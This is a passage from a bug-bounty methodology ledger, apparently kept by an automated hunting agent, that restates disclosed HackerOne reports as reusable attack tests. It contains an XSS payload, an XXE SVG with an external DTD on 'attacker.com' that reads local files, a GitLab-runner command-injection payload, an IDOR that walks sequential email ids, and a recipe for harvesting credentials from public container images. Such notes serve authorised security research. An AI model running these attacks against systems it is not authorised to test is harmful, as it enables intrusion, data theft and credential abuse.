CORE METHOD: (1) `config/application.rb` sets `config.action_view.sanitized_allowed_tags = ["select","style"]` and an endpoint reflects a parameter through `<%= sanitize @name %>`; (2) `<select><style><script>alert("XSS")</script></style></select>` alerts on rails-html-sanitizer **1.4.2 AND 1.4.3** because the tags come from the CLASS attribute; (3) the identical payload via the per-call form `<%= sanitize @name, tags: ["select","style"] %>` IS stopped by 1.4.3; (4) root cause, from the patched source: the fix wired `remove_safelist_tag_combinations(tags)` into `allowed_tags(options)` only inside `if options[:tags]` — the `else self.class.allowed_tags` branch returns the class list UNFILTERED, so the cleanup never runs on the config-file path.
DETECTION SIGNAL: a filter/validator whose parameter can arrive by more than one mechanism — per-call argument vs class-level or global config vs framework default vs env var vs inherited/reopened class; a changelog or advisory naming only ONE of those paths; an app running the "fixed" version that configures the filter through the untouched path.
CHAIN: attacker-influenced value rendered through `sanitize` (primitive: reflected input) -> allow-list read from the global class attribute, i.e. the path the fix did not clean (primitive: incomplete fix / unpatched parameter-supply path) -> `select`+`style` survives -> script in the victim's origin (Medium XSS).
TRANSFERABLE TEST: whenever a patch claims to close a bypass, enumerate EVERY path that can supply the filtered parameter (inline argument, class/global config, framework default, env var, per-tenant config, inherited class) and re-run the ORIGINAL bypass through each; here, keep the payload and switch the supply path from `tags:` to `config.action_view.sanitized_allowed_tags`. Rule: **the unit of test is the SOURCE of the parameter, not the parameter — a fix scoped to one supply path leaves every other path exploitable.**
WHY IT IS A NEW GENERAL METHOD: §17.179 records a config-injection fix landing per-ANNOTATION per-CVE (other FIELDS in the same template); this is the other axis — the SAME field, supplied through a DIFFERENT code path than the one the if/else branch the patch touched. Reusable rule: **after any security patch, grep the patched function for sibling branches/paths that return the same parameter unguarded and re-run the pre-patch exploit through them.** Slot 17.192.

NOTE — §17 additions 2026-11-08 batch 54 (§17.190–§17.192 from 3 of the batch's 6 sources). Sources that got NO slot: #1599573 (JRuby/CRuby parser-runtime differential — the general parser-differential/mXSS method is already in §1 and the `select`+`style` payload is already in §17.187; kept as a ledger technique with its delta stated) and #1906897 (OpenSSL `BIO_new_NDEF` error-path UAF — memory corruption is chain-only and sits outside §1's standalone list; kept as a ledger technique). Every new slot is a mechanism not previously in §17: §17.190 = the pool KEY as an authorization surface (vs §17.188's cross-host credential re-send); §17.191 = a client's own option/state bookkeeping selecting the wrong victim object (vs the request-smuggling connection-reuse entry and the file-write primitives); §17.192 = fix SCOPE across parameter-supply paths (vs §17.179's per-field scope in a templated config). Per-source route/honesty records are in /root/bugbountyhuntingskills.md. All three slots are UNVERIFIED (not reproduced); the batch's one MEASURED NEGATIVE (curl 8.5.0, #1565623) is recorded in the ledger and supports §17.191(a) as post-fix behaviour.

### [Bugbountyskills.md] 17.293 REDACTION MASKS THE DISPLAY, NOT THE COMPARISON — a bot that scores your input against the pre-redaction text is a per-character ORACLE that recovers the hidden secret (HackerOne "hackbot" duplicate detector, #247628, medium, $1,500, reporter `inhibitor181`; body read IN FULL this pass on the `.json` route, 2,541-char body; UNVERIFIED — not reproduced)

SOURCE: https://hackerone.com/reports/247628 — HackerOne, "Reading redacted data via hackbot's answers" (Information Disclosure, medium, reporter `inhibitor181`, disclosed 2017-07-27)
CLASS: sensitive-information disclosure via a comparison ORACLE — a similarity SCORE against a secret reference recovers the secret.
CORE METHOD: (1) verbatim: "I have found a way to use hackbot's automated duplication answers to reveal redacted data via brute force."; (2) the oracle — verbatim: "the bot does not identify duplicated reports while using the same redacted text (the black squares), but it has identified the real text that it has already been redacted."; (3) repro — verbatim: "1. Create a test program / 2. ... a submission (subject \"testredact\" and the content \"testredact password is 123456789\") / 3. ... an admin ... redact a certain part of the text / 4. ... submit a new report while trying to mimic the redacted report"; (4) the score as an oracle — verbatim: `...is 123456xxx` -> "78% the same"; `...is 123456781` -> "88% the same"; `...is 123456789` -> "100% the same"; (5) scope — verbatim: "This method should also works against public reports that have redacted content and a user can simply create his own test program", and "it does not require any other user's action."
DETECTION SIGNAL: any endpoint returning a SCORE/PERCENTAGE/SIMILARITY/DIFF of YOUR input against a value you cannot see — duplicate/clone detectors ("X% the same"), plagiarism engines, "unique comment" gates, fuzzy-search relevance, "did you mean". Tell: the score MOVES MONOTONICALLY as your guess matches more of the hidden value.
CHAIN: a secret is stored with the record but its DISPLAY is redacted (the secret is compared server-side) -> the bot scores a NEW submission against the PRE-REDACTION text (an oracle) -> per-character probing walks the score to 100% and recovers the value -> the masked credential/PII is disclosed with NO other user's action (info disclosure). The same oracle aimed at a reset "answer"/stored secret = ATO.
TRANSFERABLE TEST: send a control, then one-character variants, to any endpoint that scores your input against a hidden value; if the score moves, binary-search the secret position by position. Rule: **redaction masks the DISPLAY, not the COMPARISON — a bot that scores your guess against the pre-redaction text is a per-character oracle that recovers the secret.**
WHY IT IS A NEW GENERAL METHOD: the ledger's `oracle` entries are SSRF response/error oracles, ID oracles and boolean-blind-SQLi oracles — they leak data the SERVER fetched/queried; this one leaks a REDACTED SECRET by scoring the attacker's guesses. Slot 17.293.

### [Bugbountyskills.md] 17.295 AN XML-CONVERTED IMAGE IS AN XML-ENTITY SINK — bypass the URL filter with the protocol-relative `//host/path` form, host your own SVG plus an external DTD, and the converter resolves `file://` into a `<text>` node that is RENDERED BACK to you (Rockstar emblem editor, HackerOne #347139, critical, $1,500, reporter `alexbirsan`; reporter body `no-content`, read from the report's RESEARCHER/TEAM summary this pass — the reporter's own writeup; UNVERIFIED — not reproduced, MEASURED NEGATIVE on a local lab)

SOURCE: https://hackerone.com/reports/347139 — Rockstar Games, "LFI and SSRF via XXE in emblem editor" (XML External Entities (XXE), critical, $1,500, reporter `alexbirsan`, submitted 2018-05-03 / disclosed 2018-08-01)  read 2026-11-08.
CLASS: LFI + SSRF via XXE / XInclude in a server-side SVG->PNG conversion (the image format is XML), reached through a scheme-filter bypass.
CORE METHOD: (1) premise, verbatim: "the interesting part is a SVG to PNG conversion using user supplied input … mostly quirks in the ImageMagick version used by Rockstar"; (2) FILTER BYPASS, verbatim: `//` (double forward slash) references an SMB/UNC path and slips the regex — `<rect fill="url(//attacker.com/malicious.svg#exploit)">` "allowed me to bypass a regex filter and load arbitrary SVG data into ImageMagick by hosting an external SVG image on my server"; (3) CLASSIC XXE, verbatim: `<!DOCTYPE svg [<!ENTITY % outside SYSTEM "http://attacker.com/exfil.dtd">%outside;]>` with the external DTD `exfil.dtd` = `<!ENTITY % data SYSTEM "file:///C:/Windows/system32/drivers/etc/hosts"><!ENTITY exfil "%data;">` and `&exfil;` inside a `<text>` — "This particular version of ImageMagick was vulnerable to a regular XXE attack … I could extract text files, http responses, or even files from remote shares (again, using `//`)"; (4) ALTERNATIVE primitive, verbatim: `<text x="10" y="10"><xi:include href="https://www.google.com/" parse="text"/></text>` — "XIncludes were also supported here … the same results as the XXE method, but … a bit more reliable and straight-forward"; (5) result, verbatim: "I was able to extract text files from the server and HTTP responses by rendering them on my crew emblem."
DETECTION SIGNAL: any SVG (or XML-ish) upload/conversion surface; the converter version in error output/metadata; a URL filter that blocks `http://` but not the protocol-relative `//host/path` (SMB/UNC) — that asymmetry is the tell; a `<text>` node that renders fetched content into the image; ImageMagick with XML/RSVG/librsvg delegates.
CHAIN: emblem SVG with `fill="url(//attacker.com/malicious.svg#exploit)"` (primitive: `//` slips the scheme regex, attacker-hosted SVG loaded) -> the converter resolves external entities / XInclude (primitive: XML format + DTD/XInclude on) -> external DTD wraps `file:///C:/Windows/.../hosts`, HTTP responses or UNC/SMB shares (primitive: local file read + SSRF) -> content rendered into the emitted emblem the attacker views (impact: internal file read / SSRF WITH read-back; critical). A P4-looking "external URL in an SVG" raised to full LFI+SSRF.
TRANSFERABLE TEST: (1) put the protocol-relative `//yourhost/x.svg#f` form in every URL attribute to defeat a scheme filter; (2) host an SVG with `<!DOCTYPE … [<!ENTITY % out SYSTEM "http://yourhost/x.dtd">%out;]>` + `&exfil;` and an external DTD wrapping `file:///etc/hostname`; (3) test `<xi:include href="file:///etc/hostname" parse="text"/>`; if the rendered output shows the file's contents you have LFI, not just SSRF. Rule: **an XML-converted image is an XML-entity sink — bypass the filter with `//`, host your own SVG + DTD, and read the local file back out of the rendered image.**
WHY IT IS A NEW GENERAL METHOD: the Open-Xchange OOXML blind XXE (#334488, §17.204) is a `.pptx` package PART with an FTP-exfil DTD (document-zip parser, no `//` bypass, no XInclude); the recorded Shopify SVG XML-entity item is a stored-admin-XSS whitelist bypass; the LibreOffice/unoconv `text:section-source xlink:href` SSRF (#671935, §17.125) is a document external LINK, not an entity/XInclude inside an image. Dedupe: `347139` 0, `XInclude` 0, `xi:include` 0, `exfil.dtd` 0, `%outside` 0, `malicious.svg` 0. Slot 17.295. LOCAL LAB (localhost-only): on `rsvg-convert 2.58.0` the XInclude HTTP/file forms gave rc=0 with NO fetch and NO file content, and the entity forms FAILED at parse ("Entity 'xxe' not defined" / "Entity 'exfil' not defined") — MEASURED NEGATIVE; not reproduced.

### [Bugbountyskills.md] 17.296 A SELF-SERVICE CREATE FLOW DISABLED IN THE RESTRICTED PRODUCT'S UI IS STILL REACHABLE WHEN THE SIBLING RUNS THE SAME BACKEND — capture the create call on the open host, replay it on the restricted host with a cookie minted by a FAILED sign-in there, and the invite-only tier gate is bypassed (Slack GovSlack, HackerOne #1758174, medium 5.3, $1,500, reporter `violet`; body read IN FULL this pass on the `.json` route, 1,929-char body; UNVERIFIED — not reproduced)

SOURCE: https://hackerone.com/reports/1758174 — Slack, "Unauthorized access to GovSlack" (Improper Authentication - Generic, medium, CVSS 5.3 AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N, $1,500, reporter `violet`, submitted 2022-11-02 / disclosed 2023-05-19)  read 2026-11-08.
CLASS: authentication/authorization bypass by sibling-product endpoint reuse (a product-tier gate enforced only in the front-end).
CORE METHOD: (1) capture on the open product, verbatim: "Head to slack.com … create a workspace, copy the payload as fetch" — `POST https://slack.com/api/signup.createTeam?...` multipart with `credentials: "include"` and fields `email_misc=true`, `tz`, `locale`, `last_tos_acknowledged=tos_mar2018`, `login=true`, `in_setup_experiment=true`; (2) replay on the restricted host, verbatim: "Login to slack-gov.com, where the option to create a workspace for new users is disabled. Send this same fetch request, replacing slack.com with slack-gov.com. In my case, the workspace created is viomck.slack-gov.com."; (3) impact, verbatim: "Unauthorized access to GovSlack."; (4) mechanism, team's words, verbatim: "saving the HTTP POST request to the target /api/signup.createTeam API endpoint when creating a Slack Workspace on slack.com then using the cookies from a failed GovSlack sign-in attempt to call the endpoint, resulting in a GovSlack instance being created for the user"; (5) control bypassed, verbatim: "bypassed security controls which normally require a user to be invited to an existing GovSlack instance or contact Slack to create a new GovSlack instance", fix "blocking Govslack in /api/signup.createTeam from future use".
DETECTION SIGNAL: a product family with a RESTRICTED sibling (gov / enterprise / partner / regional host) where the OPEN product exposes a self-service flow (signup/create-team/create-org/create-instance); the restricted UI hides it but the backend API path is the SAME or trivially mapped (`/api/<action>`); the restricted host still issues a session cookie to a failed/partial sign-in. Tell: the same endpoint name answering on both hosts, and a restricted-host cookie accepted by the shared API.
CHAIN: record the state-changing create call on the open product (primitive: a normal user action) -> replay it on the restricted sibling with that host's own (even failed-login) cookie (primitive: no product/tier check on the caller) -> a resource is created inside the restricted product, invite-only gate bypassed (escalation: access to a restricted environment and its features) -> medium, $1,500; against a gov/enterprise tenant this is the door into that tenant.
TRANSFERABLE TEST: enumerate the product family (`acme.com` vs `acme-gov.com` / `acme-enterprise.*` / `*-partners.*`); for each self-service CREATE/ENROLL/SIGNUP flow on the open product, save the request and replay it on the restricted host with a cookie from a plain OR deliberately FAILED login there; a 200 that mints the resource means the gate is UI-only. Rule: **a self-service flow disabled in the restricted product's UI is still reachable when the sibling runs the same backend — capture the create call on the open host and replay it on the restricted host with that host's cookie.**
WHY IT IS A NEW GENERAL METHOD: the ledger's Slack material is red-team/CSRF/HSTS/request-smuggling plus the Office-thumbnail SSRF (#671935), none a restricted-sibling self-service flow; the recorded "hidden/unlinked endpoint still authorised" entries are ENDPOINT-shape deltas; none records a PRODUCT-TIER gate enforced only in the front-end while the SAME endpoint serves the restricted tier. Dedupe: `1758174` 0, `signup.createTeam` 0, `GovSlack` 0, `slack-gov` 0, `viomck` 0, `sibling product` 0. Slot 17.296.

NOTE — §17 additions 2026-11-08 batch 92 (§17.294–§17.296 from the pass's 3 recorded assigned sources, all disclosed HackerOne reports read this pass: #265050 and #347139 (Rockstar emblem editor SVG->PNG) via the report JSON endpoint (the `no-content` #347139 body came from its own RESEARCHER/TEAM summary — the reporter's writeup), and #1758174 (Slack GovSlack) via the JSON endpoint. The other three assigned sources — #874387 (Mail.ru capsula admin blind stored XSS), #790005 (Mail.ru 3igames SQLi), #706916 (Razer pay.gold.razer.com stored XSS) — were UNREACHABLE this pass (live `.json` 404 for all three, Cloudflare/browser wall, `r.jina.ai` 401/Cloudflare, `web_extract` 403, mirrors 404, `archive.ph` 404, Wayback HTML-only SPA shells) and get NO entry; the only public text was a one-line `og:description` each (quoted verbatim in the master ledger), which teaches no METHOD. Nothing fabricated. All three slots are UNVERIFIED (not reproduced); the two SVG slots carry a MEASURED-NEGATIVE local lab (`rsvg-convert 2.58.0`: no paint-server fetch, no XInclude resolution, external entities refused at parse). Master-ledger detail and the per-source route/honesty record are in /root/bugbountyhuntingskills.md and /root/hackbot-architecture/knowledge/methodologies-2026-11-08.md.)

### [Bugbountyskills.md] 17.312 A DECORATION/EXPANSION PARAMETER THAT RESOLVES A VALUE YOU WROTE INTO A FREE-TEXT FIELD IS AN OBJECT-REFERENCE READ — store `urn:<tenant>:<type>:<id>` as a profile website URL and the RESTLI/voyager engine returns the referenced EMAIL object in `included[]`, with no expandable-field allowlist and no ownership check (LinkedIn, HackerOne #1806939, medium 5.3, reporter `ultrapowa`; body read IN FULL this pass on the `.json` route, 2,379-char body; UNVERIFIED — not reproduced)

SOURCE: https://hackerone.com/reports/1806939 — LinkedIn, "Entire database of emails exposed through URN injection" (weakness `Code Injection`; medium 5.3 — LinkedIn staff downgraded critical -> high 7.5 -> medium 5.3; asset `www.linkedin.com`, max_severity critical; reporter `ultrapowa`; submitted 2022-12-15, disclosed 2023-05-22, resolved)  read 2026-11-09.
CLASS: cross-user sensitive-data disclosure (BAC/IDOR) in a RESTLI/voyager decoration resolver (CWE-639 / CWE-200).
CORE METHOD: (1) THE WRITE — verbatim: "Edit your profile, go to contact info, add a website and set the following URL value `urn:li:fs_emailAddress:8519272224`"; (2) THE READ — verbatim:
`GET https://www.linkedin.com/voyager/api/identity/dash/profiles?decoration=%28websites*%28url~%29%29&memberIdentity=[public identifier]&q=memberIdentity` with `accept: application/vnd.linkedin.normalized+json+2.1`, `csrf-token: ajax:<token>`, `x-li-deco-include-micro-schema: true`, `x-li-lang: en_US`, `x-restli-protocol-version: 2.0.0`; the response `included[]` (verbatim) is `{"entityUrn":"urn:li:fs_emailAddress:8519272224","confirmed":true,"email":"melaa[redacted]@gmail.com","$type":"com.linkedin.voyager.identity.normalizedprofile.EmailAddress","primary":null}`; (3) ROOT CAUSE — verbatim: "The query engine does not check whether a field should be expandable or not. Every field can be expanded."; (4) SCALE — verbatim: "Email ids are generated sequentially or pseudo-sequentially, as a result the entire database of emails is exposed." and "`urn:li:fs_phoneNumber:6131788163783364608` will actually resolve a real phone number, but these ids aren't sequential so the impact is lower."
DETECTION SIGNAL: an API whose `decoration`/`$expand`/`include`/`fields` argument takes a FIELD PATH rather than a field-name allowlist; a user-writable free-text/URL field whose value later passes through the object-resolution layer; a NON-expandable field that expands without error; `included[]` entries whose `$type`/`entityUrn` does not match the field requested; sequential ids inside the reference (`urn:li:fs_<type>:<id>`).
CHAIN: any authenticated member -> write `urn:li:fs_emailAddress:<id>` into a profile text/URL field you control -> read the object with a decoration that expands that field -> the engine resolves the URN and returns the referenced object with no expandable-field allowlist and no ownership check -> the victim's email in `included[]` -> walk the id (sequential/pseudo-sequential) -> bulk disclosure of the platform's email database.
TRANSFERABLE TEST: on any decoration/expansion API (RESTLI `decoration=(...)`, OData `$expand`, GraphQL field selection, `fields`/`include`), store a reference-shaped value in a field you are ALLOWED to write (bio, website URL, "about", custom field), then re-read the object through the expansion pointed at that field; an `included`/`expanded` node of the REFERENCED type carrying a field the field should never hold (email, phone, internal id) is the IDOR. Then walk the numeric part: +1, -1, a second account's value. Rule: **a decoration/expansion parameter that resolves a value you supplied is an object-reference read — no expandable-field allowlist + no ownership check on the resolved object = the write-into-a-text-field is the key to every record of that type.**
WHY IT IS A NEW GENERAL METHOD: §17.7 (the `reference.json` IDOR) leaks a protected object from a 4xx ERROR ENVELOPE; §17.29 (the "Export as .zip" feature) re-serves ACL-hidden comments from an EXPORT path; the GraphQL `node(id:)` material (V-12, the Shopify `BillDetails` billing entry) swaps an id inside a query the app itself makes, but the caller never gets to PLANT an object reference into a stored field. None records a free-text/URL field whose stored value is resolved as an OBJECT REFERENCE by the decoration layer. Slot 17.312.

### [Bugbountyskills.md] 17.315 A SENSITIVE VALUE SET VIA THE CLI IS MASKED ON THE OBJECT PAGE BUT RENDERED UNMASKED IN THE CLI/AUDIT-LOG VIEW → SECRET DISCLOSURE — the log is a second serializer with its own masking rules, and the tell is the two views of the same value disagreeing (Apache Airflow / Internet Bug Bounty, HackerOne #2828263, low, CVE-2024-50378; body read IN FULL this pass on the `.json` route, 706-char body; UNVERIFIED — not reproduced)

SOURCE: https://hackerone.com/reports/2828263 — Internet Bug Bounty, "Secrets not masked in UI when sensitive variables are set via Airflow cli" (weakness `Information Disclosure`; low; asset `hackerone.com/internet-bug-bounty`; reporter `saurabhb`, verified; submitted 2024-11-07, disclosed 2024-12-30, resolved; bounty yes; CVE-2024-50378, fixed in Airflow 2.10.3)  read 2026-11-09.
CLASS: sensitive information disclosure WITH PoC — a sensitive variable's VALUE is masked on the object's own list page but rendered UNMASKED in the CLI/Audit-log view (CWE-200 / CWE-532).
CORE METHOD: (1) SETUP — verbatim: "When a sensitive variable is set using Airflow cli, it should be masked on every instance where it is referenced in the UI. However it has been observed that it is masked on the Variable List page and other pages but not the Audit logs page."; (2) THE COMMAND (from the upstream fix's own tests, verbatim): `airflow variables set --description 'needed for dag 4' client_secret_234 7fh4375f5gy353wdf` — the CLI writes the FULL command line (value included) into the CLI action log; (3) THE FIX (PR `apache/airflow#43123`, "Better handling masking of values of set variable", merged) — verbatim: `airflow/utils/cli.py` adds `sub_commands_to_check_for_sensitive_key = {"variables"}` and imports `should_hide_value_for_key` from `airflow.utils.log.secrets_masker`, so the recorded command becomes `airflow variables set --description 'needed for dag 4' client_secret_234 ********`; (4) THE PAGE THAT LEAKS: the Audit logs page renders the CLI action-log row; the Variable List page masks the same value, so the two views DISAGREE.
DETECTION SIGNAL: an admin/audit/action LOG that records raw CLI commands or API requests; a `secrets_masker`/`should_hide_value_for_key` helper applied to the object list but not to the log serializer; a log row with a `command`/`query`/`body` field in plaintext. Tell: the object page shows `********` while the audit-log row shows the plaintext value.
CHAIN: a role that can set a sensitive variable via the CLI (or read a log populated by someone else's CLI command) -> the CLI action log stores the full command line including the value (the log serializer never calls the masker) -> the Audit logs page renders that row -> the plaintext secret is disclosed to every audit-log reader (escalate by checking whether the log view is readable by a LOWER role than the object page).
TRANSFERABLE TEST: on any CLI-backed admin/audit log (Airflow, Jenkins, Rundeck, a cloud/k8s console, a CI runner), set a SENSITIVE value via the CLI (`<tool> variables set <key> <value>`, a connection password, a token, a `--password` flag), then diff the object's own list page against the Audit/Action/History log page — masked on one, plaintext on the other, is the bug; then test the log view's role. Rule: **a secret that is masked on the object page but not in the audit/action log is a masking-gap disclosure — the log is a second serializer with its own escaping/masking rules, and the tell is the two views of the same value disagreeing.**
WHY IT IS A NEW GENERAL METHOD: 0 hits for `2828263`, `CVE-2024-50378`, `should_hide_value_for_key`, `secrets_masker`, `variables set`, `audit logs page`; the ledger's Airflow entries (§13.1, #1492896, #1776476, #1891795) are command-injection/RCE, and its `audit log` entries (the WordPress plugin log-poisoning XSS entry, the Valve audit-log entry, the Kubernetes audit-log detection note) are log INJECTION / logging bypass / detection — none records a secret rendered unmasked in a log view. Slot 17.315.

NOTE — §17 additions 2026-11-09 batch 98 (§17.314–§17.315 appended from 6 sources read ONE BY ONE in the given order; 3 entries appended to the harvest ledger, 2 §17 slots). Sources: #3210022 (Omise, full body via the `.json` route), #2828263 (Internet Bug Bounty, full body via the `.json` route), #974271 (Automattic, full body via the `.json` route — recorded as a carrier variant of §17.148, no new slot). NOT APPENDED: #197489 (Uber, `no-content`, 0 B — only the summary naming an unclaimed Netlify domain; dangling-CNAME class already recorded), #2178061 (TikTok, `no-content`, 0 B — only a generic reflected-XSS summary naming the `x` parameter; no payload/request/bypass), #1918362 (HackerOne, body readable 3,786 B — `GET /reports/<id>/participants` returns an invited collaborator's e-mail, but the class is already recorded via §17.28 and the #807448 invitation-`.json` entry; impact Low). Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-09.md`.

### [Bugbountyskills.md] 17.319 A CI BUILD VARIABLE THAT NAMES AN EXECUTABLE IS A COMMAND-INJECTION SINK — `DOCKER_AUTH_CONFIG` → `credHelpers` PREPENDS `docker-credential-` AND WINDOWS PATH NORMALIZATION DROPS THE NON-EXISTENT PREFIX, SO A TRAVERSAL PAYLOAD EXECUTES AN ARBITRARY PROGRAM ON THE RUNNER HOST (GitLab, HackerOne #955016, high; body read IN FULL this pass on the `.json` route, 6,609-char body; UNVERIFIED — not reproduced)

SOURCE: https://hackerone.com/reports/955016 — GitLab, "GitLab-Runner on Windows `DOCKER_AUTH_CONFIG` container host Command Injection" (weakness `OS Command Injection`; high; reporter `ajxchapman`; submitted 2020-08-10, disclosed 2020-11-04, resolved)  read 2026-11-09.
CLASS: OS command injection on the CONTAINER HOST via a CI build variable (CWE-78 / CWE-22).
CORE METHOD: (1) GitLab-Runner with a `docker` executor processes the `DOCKER_AUTH_CONFIG` build variable as a JSON docker config; `credHelpers` maps repo keys to credential-helper app names (`{"credHelpers":{"repo.example.com":"application"}}`). (2) For each pair the runner `exec`s the helper ON THE CONTAINER HOST. (3) The docker CLI prepends `docker-credential-` (`remoteCredentialsPrefix` in `native_store.go:NewNativeStore`) — enough on *nix. (4) THE WINDOWS BYPASS — Windows does not verify that directories exist during path normalization, so `{"helper":"/../../../../../../../../Windows/System32/calc.exe"}` becomes `docker-credential-/../../../../.../calc.exe` -> `C:/Windows/System32/calc.exe`. (5) ARBITRARY PAYLOAD — a `service` downloads an exe into the predictable `C:\Builds` volume dir and the `credHelper` is set to that full path (`/../../../../../../../../ProgramData/docker/volumes/runner-<token>-concurrent-0-cache-<hash>/_data/testfile.exe`); works because the build dir is predictable, `DOCKER_AUTH_CONFIG` is processed once per container, and the build container starts after all `service` containers. (6) REPRO — `services:[alpasdfasdfasdfasdfasdfidne:3.5]`, `variables: DOCKER_AUTH_CONFIG: "{\"credHelpers\":{\"repo.example.com\":\"/../../../../../../../../Windows/System32/calc.exe\"}}"`, job tagged `windows-docker-runner`; confirmed on gitlab-runner 13.2.2 / Windows 10 + Docker Toolbox and Windows 2019 + Docker Enterprise. (7) Impact — "compromise the underlying system on which `gitlab-runner` runs, exposing source code, build artifacts and other sensitive data".
DETECTION SIGNAL: a CI/CD build variable or config field whose value NAMES an executable or a path (a credential helper, a signing/notary tool, a custom runner binary); a Windows runner/host; a docker `credHelpers`/`credsStore`/`auths` config supplied from a pipeline variable; a build-log line showing a `docker-credential-*` invocation.
CHAIN: any user who can define a CI variable / `.gitlab-ci.yml` (primitive: a low-privilege developer on a shared runner) -> the `credHelpers` value reaches the docker CLI's helper resolver -> the resolver prepends `docker-credential-` and Windows path-normalizes the non-existent prefix away -> the attacker-chosen program executes ON THE RUNNER HOST (escalation: container escape / host compromise) -> the host runs every future build, so the attacker gains source code, build artifacts and any secrets/tokens the runner can reach (impact: Critical).
TRANSFERABLE TEST: on any CI/CD system whose build config can name an executable or a helper, set the value to a traversal payload naming a benign system binary — `{"credHelpers":{"repo.example.com":"/../../../../../../../../Windows/System32/calc.exe"}}` (Windows) or the equivalent helper-name/path injection on the host OS — and watch the build log / host for execution; then replace the binary with a payload downloaded by a `service` container into the predictable build volume. Rule: **a build variable that names an executable is a command-injection sink — the fix prefix (`docker-credential-`) is not a sanitizer on Windows because Windows path normalization drops the non-existent prefix; the impact is code execution on the runner HOST, which sees every future build's source and secrets.**
WHY IT IS A NEW GENERAL METHOD: 0 hits for `955016`, `ajxchapman`, `DOCKER_AUTH_CONFIG`, `credHelpers`, `docker-credential-`, `readConfigsFromCredentialsHelper`, `native_store.go`; the ledger's GitLab entries are CI-cache poisoning, the `cors_proxy` SSRF (§17.266), the AsciiDoc/Kroki file read/write (#1098793), the OAuth parameter-pollution (#1148364) and the request-approval XSS (#402658) — none is a build-variable -> executable-name -> host command injection; the ledger's Windows-path-normalization material is filesystem path handling, not a credential-helper prefix. Slot 17.319.

NOTE — §17 additions 2026-11-09 batch 100 (§17.317–§17.319 appended from 6 sources read ONE BY ONE in the given order; 4 entries appended to the harvest ledger, 3 §17 slots). Sources: #1219038 (Rockstar, `no-content` — technique from the credited writeup youst.in -> §17.317), #1342422 (Basecamp, full body via the `.json` route — NS-delegation subdomain takeover, ledger entry, no §17 slot), #1153862 (QIWI, body from the LOCAL parquet mirror after every live route failed -> §17.318), #955016 (GitLab, full body via the `.json` route -> §17.319). NOT APPENDED: #2160178 (Trellix, body readable 504 B — bare `admin`/`admin` default-credential login; the technique is the already-recorded default-credential wordlist, no bypass, no chain). INVALID: #1554048 (TikTok, `no-content`, 0 B body — only the title "XSS Payload on TikTok Seller Center endpoint"; no payload, parameter or request shape). Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-09.md`.

### [Bugbountyskills.md] 17.356 A PUBLIC CONTAINER IMAGE IS PART OF THE ATTACK SURFACE — PULL THE ORG'S IMAGES, EXTRACT EVERY LAYER, AND GREP FOR CREDENTIALS; A `test/` OR `scripts/` CONFIG LEFT IN A PRODUCTION IMAGE IS THE CLASSIC CARRIER (Mozilla, HackerOne #2401648, "two aws access key and secret key and database username and password exposed", weakness Information Disclosure, critical, reporter `ghaazy`, submitted 2024-03-04, disclosed 2024-10-18; body read IN FULL this pass on the `.json` route, 611 B; UNVERIFIED — not reproduced)

SOURCE: https://hackerone.com/reports/2401648  read 2026-11-10.
CLASS: sensitive information disclosure WITH PoC — a public container image ships hardcoded cloud and database credentials in a config file (CWE-200 / CWE-798).
CORE METHOD: (1) THE ENTRY POINT, verbatim — "go to https://hub.docker.com/r/mozilla/commonvoice and do pull for this image"; (2) THE SECRET FILE, verbatim — "you will find them in /code/scripts/test/config.json"; (3) THE SECRETS, verbatim — "i found two aws access key and secret key and database username and password exposed in dockerhub image"; (4) IMPACT, verbatim — "exposure of sensitive data lead to many serious attacks and access".
DETECTION SIGNAL: an organization's PUBLIC container registry (Docker Hub, GHCR, public ECR) with images that are pullable without auth; a config file inside the image that carries live credentials (`config.json`, `.env`, `application.properties`, `appsettings.json`, `credentials`, `*.pem`, `settings.py`); a `test/` or `scripts/` directory left in a production-tagged image; AWS `AccessKeyId`/`SecretAccessKey` pairs or DB user/password pairs in a layer.
CHAIN: any unauthenticated attacker -> `docker pull <org>/<public-image>` (primitive: the image is public) -> extract the layers and read `/code/scripts/test/config.json` (primitive: the file is in the image) -> obtain two AWS access-key/secret-key pairs and a DB username/password (escalation: cloud + database credentials) -> use the AWS keys against the cloud account and the DB creds against the database (impact: cloud account compromise / data breach; program rated Critical). Per doctrine §8: preconditions = none (the image is public); gain = live AWS IAM credentials and database credentials.
TRANSFERABLE TEST: for every public image an org publishes (`docker pull <org>/<image>`, or the registry's `_catalog`/tags API), extract the filesystem (`docker save` / `crane export` / `skopeo`) and grep for credential material: `grep -rEi '(aws_access_key_id|aws_secret_access_key|password|secret|api[_-]?key|private[_-]?key)' /` plus a targeted read of `config.json`, `.env`, `application.properties`, `appsettings.json`, `settings.py`, and any `test/`/`scripts/` directory; validate any AWS key found with `aws sts get-caller-identity`. Rule: **a public container image is part of the attack surface — pull it, extract every layer, and grep for credentials; a `test/` or `scripts/` config left in a production image is the classic carrier.**
WHY IT IS A NEW GENERAL METHOD: 0 hits for `2401648`, `dockerhub`, `docker pull`, `commonvoice`, `config.json` as a credential carrier, or container-image secret harvesting; the playbook's "Hardcoded secrets" row (trufflehog/gau on SOURCE CODE) is a different surface — this is the IMAGE LAYER surface, and the carrier is a runtime config file, not a source file. Slot 17.356.

NOTE — §17 additions 2026-11-10 batch 116 (§17.355–§17.356 appended from 6 sources read ONE BY ONE in the given order; 4 entries appended to the harvest ledger, 2 §17 slots). Sources: #79348 (Slack, full body via the `.json` route — DELTA, no §17 slot), #3527771 (GitHub, `no-content` — method read from NVD CVE-2026-3306 + GHES release notes + Wiz; DELTA, no §17 slot), #2200329 (Mars, `no-content` — request shape read from the reporter's public PoC + CODE WHITE -> §17.355), #2401648 (Mozilla, full body via the `.json` route -> §17.356). INVALID: #3126603 (Mars, `no-content`, 0 B — live page renders the site's own error, `r.jina.ai` blank, all 5 Wayback captures are JS-disabled shells, only a generic auto-summary naming the `customerId` parameter -> nothing concrete to teach), #2697592 (IBM, `no-content`, 0 B — live page a JS shell, `r.jina.ai` metadata only, all 4 Wayback captures are JS-disabled shells, sibling #2697601 also `no-content`, no public writeup -> nothing concrete to teach). 0 fabricated. Full per-source route/honesty records are in the harvest ledger `/root/bugbountyhuntingskills.md` and `/root/hackbot-architecture/knowledge/methodologies-2026-11-10.md`.

